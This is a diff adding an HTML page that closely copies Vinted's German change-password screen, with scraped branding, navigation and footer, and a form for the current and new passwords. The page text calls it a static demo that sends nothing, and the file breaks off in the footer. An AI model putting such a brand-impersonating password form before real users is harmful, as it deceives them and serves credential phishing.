@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="de" data-brand="vint">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Passwort ändern · Vinted</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="067fee12c26bae06.css"/>
+  <link rel="stylesheet" href="/chat-widget.css"/>
+  <style>
+    html { font-size: 62.5%; }
+    body.v_inter_b0f5c119-module__kyvDTG__className {
+      font-family: Inter, "Helvetica Neue", Helvetica, Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .next-page { flex: 1; display: flex; flex-direction: column; min-height: 100vh; }
+    .standard-layout.is-wide { flex: 1; display: flex; flex-direction: column; }
+    /* Footer sticks bottom on short pages */
+    .u-ui-margin-top-auto { margin-top: auto; }
+
+    /*
+      Mobile / narrow: Vinted CSS keeps .is-wide .container { width:1280px } (beats .container{width:auto}
+      in media queries). Flex children default to min-width:auto, so the column can stay ~desktop-wide
+      inside a 400px frame — content hugs the left with empty space / scroll. Force full bleed.
+    */
+    @media only screen and (max-width: 959px) {
+      html {
+        overflow-x: hidden;
+      }
+      body.v_inter_b0f5c119-module__kyvDTG__className {
+        width: 100%;
+        max-width: 100%;
+        overflow-x: hidden;
+      }
+      .next-page,
+      .next-page > div,
+      .standard-layout.is-wide,
+      main.site.u-background-white,
+      main.site.u-background-white > div,
+      .site-content,
+      .container,
+      .container > .row,
+      #content.grid12,
+      .body-content {
+        width: 100%;
+        max-width: 100%;
+        min-width: 0;
+        box-sizing: border-box;
+      }
+      .is-wide .container {
+        width: 100% !important;
+        max-width: 100% !important;
+      }
+      .auth__container {
+        width: 100%;
+        max-width: 100%;
+        padding-left: 8px;
+        padding-right: 8px;
+        box-sizing: border-box;
+      }
+      .auth__container .web_ui__Card__card {
+        max-width: 100%;
+        box-sizing: border-box;
+      }
+      footer[data-testid="main-footer"] .container {
+        max-width: 100%;
+      }
+      .l-header.js-header,
+      .l-header,
+      .l-search {
+        width: 100%;
+        max-width: 100%;
+        box-sizing: border-box;
+      }
+    }
+
+    /*
+      Footer: HTML uses CSS-module class names from a chunk you did not save.
+      067fee12c26bae06.css has no rules for _main-footer-module__… — restore layout here.
+    */
+    footer[data-testid="main-footer"] {
+      background: #fff;
+      color: #5a6566;
+      font-size: 1.3rem;
+      line-height: 1.25;
+    }
+    footer[data-testid="main-footer"] .container {
+      box-sizing: border-box;
+      max-width: 1170px;
+      margin: 0 auto;
+      padding: 0 16px;
+    }
+    footer[data-testid="main-footer"] .container > ul:nth-of-type(1) {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 24px 40px;
+      list-style: none;
+      margin: 0;
+      padding: 28px 0 8px;
+    }
+    footer[data-testid="main-footer"] .container > ul:nth-of-type(1) > li[class*="links-section-item"] {
+      flex: 1 1 160px;
+      min-width: 140px;
+      max-width: 320px;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] .container > ul:nth-of-type(1) > li.u-margin-none {
+      display: none;
+    }
+    footer[data-testid="main-footer"] [class*="links-section-label"] {
+      font-weight: 600;
+      color: #15191a;
+      margin: 0 0 12px;
+      font-size: 1.3rem;
+    }
+    footer[data-testid="main-footer"] ul[class*="links-section-group"] {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] li[class*="links-section-row"] {
+      list-style: none;
+      margin: 0 0 10px;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] a[class*="links-section-link"] {
+      color: #5a6566;
+      text-decoration: none;
+    }
+    footer[data-testid="main-footer"] a[class*="links-section-link"]:hover {
+      text-decoration: underline;
+    }
+    footer[data-testid="main-footer"] .web_ui__Divider__divider {
+      border: 0;
+      border-top: 1px solid #e1e4e4;
+      margin: 0;
+      height: 0;
+    }
+    footer[data-testid="main-footer"] [class*="main-footer__social-section"] {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 20px;
+      padding: 20px 0;
+    }
+    footer[data-testid="main-footer"] ul[class*="social-section-media"] {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      gap: 10px;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] ul[class*="social-section-media"] li {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] ul[class*="social-section-media"] a {
+      display: flex;
+      width: 40px;
+      height: 40px;
+      align-items: center;
+      justify-content: center;
+      background: #eef0f0;
+      border-radius: 4px;
+    }
+    footer[data-testid="main-footer"] ul[class*="social-section-media"] img {
+      width: 22px;
+      height: 22px;
+      display: block;
+    }
+    footer[data-testid="main-footer"] ul[class*="social-section-app-store"] {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      gap: 12px;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] ul[class*="social-section-app-store"] li {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] ul[class*="social-section-app-store"] img {
+      height: 40px;
+      width: auto;
+      display: block;
+    }
+    footer[data-testid="main-footer"] .container > ul:nth-of-type(2) {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 8px 20px;
+      list-style: none;
+      margin: 0;
+      padding: 20px 0 36px;
+    }
+    footer[data-testid="main-footer"] .container > ul:nth-of-type(2) > li {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    footer[data-testid="main-footer"] a[class*="privacy-section-link"],
+    footer[data-testid="main-footer"] button[class*="privacy-section-link"] {
+      color: #007782;
+      text-decoration: none;
+      background: none;
+      border: 0;
+      padding: 0;
+      font: inherit;
+      font-size: 1.3rem;
+      cursor: pointer;
+    }
+    footer[data-testid="main-footer"] a[class*="privacy-section-link"]:hover,
+    footer[data-testid="main-footer"] button[class*="privacy-section-link"]:hover {
+      text-decoration: underline;
+    }
+    main.site.passchange-main {
+      background: #f4f6f6;
+    }
+  </style>
+</head>
+<body class="v_inter_b0f5c119-module__kyvDTG__className">
+<div class="next-page">
+<div class="standard-layout is-wide">
+<div class="l-header js-header"><header class="l-header__main"><div class="container u-flexbox u-align-items-center u-fill-height"><div class="u-flexbox u-align-items-center u-fill-width"><div class="l-header__skip-to-content"><a href="#content" class="web_ui__Button__button web_ui__Button__filled web_ui__Button__small web_ui__Button__primary web_ui__Button__truncated web_ui__Button__icon-right"><span class="web_ui__Button__content"><span class="web_ui__Button__label">Weiter zum Inhalt</span><span class="web_ui__Button__icon"><span class="web_ui__Icon__icon" style="width:16px"><svg fill="none" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M1 7.949c0 .432.345.783.77.783h10.738l-4.51 4.958a.79.79 0 0 0 .048 1.107.76.76 0 0 0 1.074-.042l5.6-6.038a1.057 1.057 0 0 0 0-1.433l-5.602-6.04a.755.755 0 0 0-1.07-.042.785.785 0 0 0-.042 1.107l4.502 4.856H1.77a.777.777 0 0 0-.771.784Z"></path></svg></span></span></span></a></div><div class="l-header__logo"><a title="Vinted-Logo" aria-label="Vinted-Logo" class="u-block" href="/" data-testid="header-logo-id"><div class="u-ui-padding-left-small"><div class="l-header__logo-container"><div class="web_ui__Image__image"><img src="https://marketplace-web-assets.vinted.com/_next/static/media/logo.5398230b.svg" alt="Vinted-Logo" class="web_ui__Image__content"></div></div></div></a></div><div class="u-desktops-only u-fill-width u-position-relative u-z-index-notification u-ui-margin-right-x3-large"><div><div><form action="/catalog" method="get"><div class="u-position-relative"><div class="web_ui__InputBar__input-bar" data-testid="search-text"><div class="web_ui__InputBar__prefix"><div class="u-flexbox u-fill-height"><div class="u-position-relative"><button type="button" aria-expanded="false" class="web_ui__Button__button web_ui__Button__flat web_ui__Button__medium web_ui__Button__muted web_ui__Button__truncated web_ui__Button__icon-right" data-testid="search-bar-search-type"><span class="web_ui__Button__content"><span class="web_ui__Button__label"><span id="search-item">Katalog</span></span><span class="web_ui__Button__icon"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M8 12 2 6h12z"></path></svg></span></span></span></button></div><div class="web_ui__Divider__divider web_ui__Divider__vertical"></div></div></div><div class="web_ui__InputBar__input"><div class="web_ui__InputBar__icon"><div class="u-flexbox u-align-items-center"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg fill="none" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" d="M13.006 7.003a5.97 5.97 0 0 1-1.265 3.677l2.728 2.729a.75.75 0 0 1-1.06 1.06l-2.73-2.729a5.97 5.97 0 0 1-3.676 1.266 6.004 6.004 0 1 1 6.003-6.003M2.5 7c0 2.481 2.019 4.5 4.5 4.5s4.5-2.019 4.5-4.5S9.481 2.5 7 2.5A4.505 4.505 0 0 0 2.5 7" clip-rule="evenodd"></path></svg></span></div></div><input id="search_text" placeholder="Suche Artikel" data-testid="search-text--input" class="web_ui__InputBar__value" autocomplete="off" maxlength="5000" aria-labelledby="search-item" name="search_text" value=""></div><div class="web_ui__InputBar__suffix"></div></div></div></form></div></div></div><div class="u-flexbox u-margin-left-auto u-align-items-center u-position-relative u-z-index-notification"><div class="u-desktops-only u-flexbox u-align-items-center"><div><a href="/member/signup/select_type?ref_url=%2F" class="web_ui__Button__button web_ui__Button__outlined web_ui__Button__small web_ui__Button__primary web_ui__Button__truncated" data-testid="header--login-button"><span class="web_ui__Button__content"><span class="web_ui__Button__label">Registrieren | Einloggen</span></span></a></div><div class="web_ui__Spacer__regular web_ui__Spacer__vertical"></div><!--$--><a rel="nofollow" href="/member/signup/select_type" class="web_ui__Button__button web_ui__Button__filled web_ui__Button__small web_ui__Button__primary web_ui__Button__truncated"><span class="web_ui__Button__content"><span class="web_ui__Button__label">Artikel verkaufen</span></span></a><!--/$--><a aria-label="Hilfe" href="/help?access_channel=vinted_guide" class="web_ui__Button__button web_ui__Button__flat web_ui__Button__default web_ui__Button__primary web_ui__Button__truncated web_ui__Button__icon-left web_ui__Button__without-text"><span class="web_ui__Button__content"><span class="web_ui__Button__icon"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:24px"><svg fill="none" viewBox="0 0 24 24" width="24" height="24" aria-hidden="true"><path fill="currentColor" d="M12 21.5a9.5 9.5 0 1 0 0-19 9.5 9.5 0 0 0 0 19M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11"></path><path fill="currentColor" d="M12 7.75c-.826 0-1.5.674-1.5 1.5a.75.75 0 0 1-1.5 0c0-1.654 1.346-3 3-3s3 1.346 3 3c0 1.133-.538 2.036-1.415 2.716-.362.28-.835.515-.835 1.034a.75.75 0 0 1-1.5 0c0-1.031.662-1.635 1.415-2.219.514-.399.835-.86.835-1.531 0-.826-.674-1.5-1.5-1.5M13 16a1 1 0 1 1-2 0 1 1 0 0 1 2 0"></path></svg></span></span></span></a><div class="u-position-relative"><div><div class="u-mobiles-only"><div class="web_ui__Label__label web_ui__Label__default web_ui__Label__stacked"><div class="web_ui__Label__content">Sprache</div></div><div class="web_ui__Cell__cell web_ui__Cell__default web_ui__Cell__navigating" role="button" tabindex="0"><div class="web_ui__Cell__prefix"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:24px"><svg fill="none" viewBox="0 0 24 24" width="24" height="24" aria-hidden="true"><path fill="currentColor" d="M16 16.5h5.25a.75.75 0 0 0 0-1.5h-5.026c.116-.983.178-1.923.178-3a25 25 0 0 0-.178-3h5.026a.75.75 0 0 0 0-1.5H16C15.303 3.722 13.775 1 12.002 1S8.7 3.722 8.004 7.5H3A.75.75 0 0 0 3 9h4.779a25 25 0 0 0-.177 3c0 1.077.061 2.017.177 3H3a.75.75 0 0 0 0 1.5h5.004c.696 3.778 2.225 6.5 3.998 6.5s3.3-2.722 3.997-6.5Zm-1.528 0c-.197.99-.453 1.975-.752 2.721-.356.89-.743 1.511-1.096 1.884-.35.37-.56.395-.622.395-.063 0-.274-.025-.623-.395-.353-.373-.74-.993-1.096-1.884-.299-.746-.555-1.731-.752-2.721zM9.29 15c-.122-.97-.188-1.91-.188-3s.066-2.03.188-3h5.424c.12.97.188 1.91.188 3s-.067 2.03-.189 3zm.24-7.5c.198-.99.454-1.975.753-2.721.356-.89.743-1.511 1.096-1.884.35-.37.56-.395.623-.395s.273.025.622.395c.353.373.74.993 1.096 1.884.299.746.555 1.73.752 2.721H9.531Z"></path><path fill="currentColor" d="M12 21.5a9.5 9.5 0 1 1 0-19 9.5 9.5 0 0 1 0 19m0 1.5c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11"></path></svg></span></div><div class="web_ui__Cell__content"><div class="web_ui__Cell__body"><h3 class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__left web_ui__Text__amplified">Deutsch</h3><div class="web_ui__Spacer__small web_ui__Spacer__vertical"></div><h3 class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__left web_ui__Text__muted">(German)</h3></div></div></div></div><div class="u-desktops-only"><div><div class="u-ui-padding-left-small"><button type="button" aria-expanded="false" class="web_ui__Button__button web_ui__Button__flat web_ui__Button__medium web_ui__Button__muted web_ui__Button__inline web_ui__Button__icon-right" data-testid="language-selector-button"><span class="web_ui__Button__content"><span class="web_ui__Button__label">DE</span><span class="web_ui__Button__icon"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M8 12 2 6h12z"></path></svg></span></span></span></button></div></div></div></div></div></div></div><div class="u-mobiles-only"><button type="button" aria-label="Menü geöffnet" class="web_ui__Button__button web_ui__Button__flat web_ui__Button__default web_ui__Button__primary web_ui__Button__truncated web_ui__Button__icon-left web_ui__Button__without-text"><span class="web_ui__Button__content"><span class="web_ui__Button__icon"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-3" style="width:24px"><svg fill="none" viewBox="0 0 24 24" width="24" height="24" aria-hidden="true"><path fill="currentColor" d="M1 4.75c0 .414.336.75.75.75h20.5a.75.75 0 0 0 0-1.5H1.75a.75.75 0 0 0-.75.75M1 12a.75.75 0 0 1 .75-.75h20.5a.75.75 0 0 1 0 1.5H1.75A.75.75 0 0 1 1 12m0 7.25a.75.75 0 0 1 .75-.75h20.5a.75.75 0 0 1 0 1.5H1.75a.75.75 0 0 1-.75-.75"></path></svg></span></span></span></button></div></div></div></header><div class="l-header__navigation"><div class="u-desktops-only"><div class="container"><div><div><nav data-testid="nav-tabs"><div><div class="web_ui__Tabs__tabs"><ul class="web_ui__Tabs__content" role="tablist"><li id="1904" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-1904">Damen</span></div></li><li id="5" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-5">Herren</span></div></li><li id="2993" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-2993">Designerartikel</span></div></li><li id="1193" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-1193">Kinder</span></div></li><li id="1918" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-1918">Home</span></div></li><li id="2994" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-2994">Elektronik</span></div></li><li id="2309" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-2309">Unterhaltung</span></div></li><li id="4824" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-4824">Hobby- &amp; Sammlerartikel</span></div></li><li id="4332" class="web_ui__Tabs__tab" role="tab" aria-selected="false" tabindex="0"><div class="u-fill-width u-fill-height u-flexbox u-align-items-center u-justify-content-center"><span class="web_ui__Text__text web_ui__Text__subtitle web_ui__Text__center web_ui__Text__parent" data-testid="first-category-4332">Sport</span></div></li></ul></div></div></nav></div></div></div></div></div></div><div class="l-search"><div class="web_ui__Cell__cell web_ui__Cell__tight" role="presentation"><div class="web_ui__Cell__content"><div class="web_ui__Cell__body"><div class="u-ui-padding-vertical-regular"><div class="container"><div class="u-flexbox"><div class="u-fill-width"><div><div><form action="/catalog" method="get"><div class="u-position-relative"><div class="web_ui__InputBar__input-bar" data-testid="search-text"><div class="web_ui__InputBar__prefix"><div class="u-flexbox u-fill-height"><div class="u-position-relative"><button type="button" aria-expanded="false" class="web_ui__Button__button web_ui__Button__flat web_ui__Button__medium web_ui__Button__muted web_ui__Button__truncated web_ui__Button__icon-right" data-testid="search-bar-search-type"><span class="web_ui__Button__content"><span class="web_ui__Button__label"><span id="search-item">Katalog</span></span><span class="web_ui__Button__icon"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M8 12 2 6h12z"></path></svg></span></span></span></button></div><div class="web_ui__Divider__divider web_ui__Divider__vertical"></div></div></div><div class="web_ui__InputBar__input"><div class="web_ui__InputBar__icon"><div class="u-flexbox u-align-items-center"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg fill="none" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" d="M13.006 7.003a5.97 5.97 0 0 1-1.265 3.677l2.728 2.729a.75.75 0 0 1-1.06 1.06l-2.73-2.729a5.97 5.97 0 0 1-3.676 1.266 6.004 6.004 0 1 1 6.003-6.003M2.5 7c0 2.481 2.019 4.5 4.5 4.5s4.5-2.019 4.5-4.5S9.481 2.5 7 2.5A4.505 4.505 0 0 0 2.5 7" clip-rule="evenodd"></path></svg></span></div></div><input id="search_text_mobile" placeholder="Suche Artikel" data-testid="search-text--input" class="web_ui__InputBar__value" autocomplete="off" maxlength="5000" aria-labelledby="search-item" name="search_text" value=""></div><div class="web_ui__InputBar__suffix"></div></div></div></form></div></div></div></div></div></div></div></div></div></div>
+<main class="site u-background-white passchange-main"><div><div class="site-content"><div class="container"><div class="row u-position-relative"><div id="content" class="grid12"><div class="body-content">
+<div class="web_ui__Spacer__x2-large web_ui__Spacer__horizontal"></div><div class="auth__container"><div class="web_ui__Card__card web_ui__Card__overflowAuto"><div class="web_ui__Spacer__x2-large web_ui__Spacer__horizontal"></div><span data-testid="change-password-view"><form id="change-password-form" action="#" method="get"><div class="u-ui-margin-horizontal-large"><h1 id="auth_modal_title" class="web_ui__Text__text web_ui__Text__heading web_ui__Text__center web_ui__Text__parent">Passwort ändern</h1><div class="web_ui__Spacer__x-large web_ui__Spacer__horizontal"></div><p class="web_ui__Text__text web_ui__Text__body web_ui__Text__center web_ui__Text__muted" style="max-width:36rem;margin:0 auto;">Gib dein aktuelles Passwort ein und wähle ein neues (mindestens 8 Zeichen). Statische Demo — es wird nichts gesendet.</p><div class="web_ui__Spacer__x-large web_ui__Spacer__horizontal"></div></div><div class="web_ui__Input__input"><div class="web_ui__Input__content"><input class="web_ui__Input__value web_ui__Input__with-suffix" id="password-current" placeholder="Aktuelles Passwort" type="password" name="password_current" autocomplete="current-password"><div class="web_ui__Input__suffix"><button type="button" class="u-cursor-pointer js-pw-toggle" data-target="password-current" aria-label="Passwort anzeigen"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg fill="none" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M14.53 2.53a.75.75 0 0 0-1.06-1.06l-2.163 2.162A8.9 8.9 0 0 0 8 3C4.15 3 1.513 5.398.276 7.143a1.47 1.47 0 0 0 0 1.714 10.4 10.4 0 0 0 3.004 2.802l-1.81 1.81a.75.75 0 1 0 1.06 1.061zM4.386 10.553a8.8 8.8 0 0 1-2.838-2.552V8s0-.003.003-.007C2.632 6.467 4.857 4.5 8 4.5c.764 0 1.473.116 2.126.314L8.788 6.15A2.1 2.1 0 0 0 8 6c-1.14 0-2.063.895-2.063 2 0 .293.065.57.181.821zm2.928 1.194a.87.87 0 0 1 .625-.247H8c3.143 0 5.367-1.967 6.449-3.492q.004-.006.003-.007V8s0-.003-.003-.007a8.7 8.7 0 0 0-1.014-1.181c-.321-.314-.351-.834-.034-1.151a.717.717 0 0 1 1-.031 10.3 10.3 0 0 1 1.323 1.514 1.47 1.47 0 0 1 0 1.714C14.487 10.602 11.85 13 8 13q-.127 0-.25-.003c-.653-.018-.898-.789-.436-1.25"></path></svg></span></button></div></div></div><div class="web_ui__Spacer__regular web_ui__Spacer__horizontal"></div><div class="web_ui__Input__input"><div class="web_ui__Input__content"><input class="web_ui__Input__value web_ui__Input__with-suffix" id="new-password" placeholder="Neues Passwort" type="password" name="new_password" autocomplete="new-password"><div class="web_ui__Input__suffix"><button type="button" class="u-cursor-pointer js-pw-toggle" data-target="new-password" aria-label="Passwort anzeigen"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg fill="none" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M14.53 2.53a.75.75 0 0 0-1.06-1.06l-2.163 2.162A8.9 8.9 0 0 0 8 3C4.15 3 1.513 5.398.276 7.143a1.47 1.47 0 0 0 0 1.714 10.4 10.4 0 0 0 3.004 2.802l-1.81 1.81a.75.75 0 1 0 1.06 1.061zM4.386 10.553a8.8 8.8 0 0 1-2.838-2.552V8s0-.003.003-.007C2.632 6.467 4.857 4.5 8 4.5c.764 0 1.473.116 2.126.314L8.788 6.15A2.1 2.1 0 0 0 8 6c-1.14 0-2.063.895-2.063 2 0 .293.065.57.181.821zm2.928 1.194a.87.87 0 0 1 .625-.247H8c3.143 0 5.367-1.967 6.449-3.492q.004-.006.003-.007V8s0-.003-.003-.007a8.7 8.7 0 0 0-1.014-1.181c-.321-.314-.351-.834-.034-1.151a.717.717 0 0 1 1-.031 10.3 10.3 0 0 1 1.323 1.514 1.47 1.47 0 0 1 0 1.714C14.487 10.602 11.85 13 8 13q-.127 0-.25-.003c-.653-.018-.898-.789-.436-1.25"></path></svg></span></button></div></div></div><div class="web_ui__Spacer__regular web_ui__Spacer__horizontal"></div><div class="web_ui__Input__input"><div class="web_ui__Input__content"><input class="web_ui__Input__value web_ui__Input__with-suffix" id="confirm-password" placeholder="Neues Passwort bestätigen" type="password" name="confirm_password" autocomplete="new-password"><div class="web_ui__Input__suffix"><button type="button" class="u-cursor-pointer js-pw-toggle" data-target="confirm-password" aria-label="Passwort anzeigen"><span class="web_ui__Icon__icon web_ui__Icon__greyscale-level-2" style="width:16px"><svg fill="none" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M14.53 2.53a.75.75 0 0 0-1.06-1.06l-2.163 2.162A8.9 8.9 0 0 0 8 3C4.15 3 1.513 5.398.276 7.143a1.47 1.47 0 0 0 0 1.714 10.4 10.4 0 0 0 3.004 2.802l-1.81 1.81a.75.75 0 1 0 1.06 1.061zM4.386 10.553a8.8 8.8 0 0 1-2.838-2.552V8s0-.003.003-.007C2.632 6.467 4.857 4.5 8 4.5c.764 0 1.473.116 2.126.314L8.788 6.15A2.1 2.1 0 0 0 8 6c-1.14 0-2.063.895-2.063 2 0 .293.065.57.181.821zm2.928 1.194a.87.87 0 0 1 .625-.247H8c3.143 0 5.367-1.967 6.449-3.492q.004-.006.003-.007V8s0-.003-.003-.007a8.7 8.7 0 0 0-1.014-1.181c-.321-.314-.351-.834-.034-1.151a.717.717 0 0 1 1-.031 10.3 10.3 0 0 1 1.323 1.514 1.47 1.47 0 0 1 0 1.714C14.487 10.602 11.85 13 8 13q-.127 0-.25-.003c-.653-.018-.898-.789-.436-1.25"></path></svg></span></button></div></div></div><div class="web_ui__Spacer__regular web_ui__Spacer__horizontal"></div><div class="web_ui__Cell__cell web_ui__Cell__default" role="presentation"><div class="web_ui__Cell__content"><div class="web_ui__Cell__body"><button type="submit" class="web_ui__Button__button web_ui__Button__filled web_ui__Button__default web_ui__Button__primary web_ui__Button__truncated"><span class="web_ui__Button__content"><span class="web_ui__Button__label">Passwort speichern</span></span></button><div class="web_ui__Spacer__x-large web_ui__Spacer__horizontal"></div><span class="web_ui__Text__text web_ui__Text__body web_ui__Text__center web_ui__Text__parent"><a class="u-disable-underline" href="index.html">← Zurück zum Log-in</a></span><div class="web_ui__Spacer__regular web_ui__Spacer__horizontal"></div><span class="web_ui__Text__text web_ui__Text__body web_ui__Text__center web_ui__Text__parent"><a class="u-disable-underline" href="https://www.vinted.de/help/103" target="_blank" rel="noreferrer">Brauchst du Hilfe?</a></span><div class="web_ui__Spacer__regular web_ui__Spacer__horizontal"></div></div></div></div></form></span></div></div><div class="web_ui__Spacer__x5-large web_ui__Spacer__horizontal"></div>
+</div></div></div></div></div></div></main>
+<div class="u-ui-margin-top-auto">
+<footer data-testid="main-footer"><div class="_main-footer-module-scss-module__-idQ1q__main-footer__content"><div class="container"><!--$--><ul class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section"><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-item"><div class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-label">Vinted</div><ul class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-group"><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/about">Über uns</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="https://company.vinted.com/sustainability?lang=de">Nachhaltigkeit</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="https://company.vinted.com/newsroom">Presse</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/advertising">Werbung</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/accessibility" data-testid="accessibility-link-footer">Barrierefreiheit</a></li></ul></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-item"><div class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-label">Entdecken</div><ul class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-group"><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/how_it_works">Wie funktioniert's?</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/item_verification">Artikelverifizierung</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/app">Smartphone-Apps</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/infoboard">Infoboard</a></li><!--$--><!--/$--></ul></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-item"><div class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-label">Hilfe</div><ul class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-group"><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/help">Hilfe-Center</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/help/4-selling?access_channel=hc_topics">Verkaufen</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/help/5-buying?access_channel=hc_topics">Kaufen</a></li><li 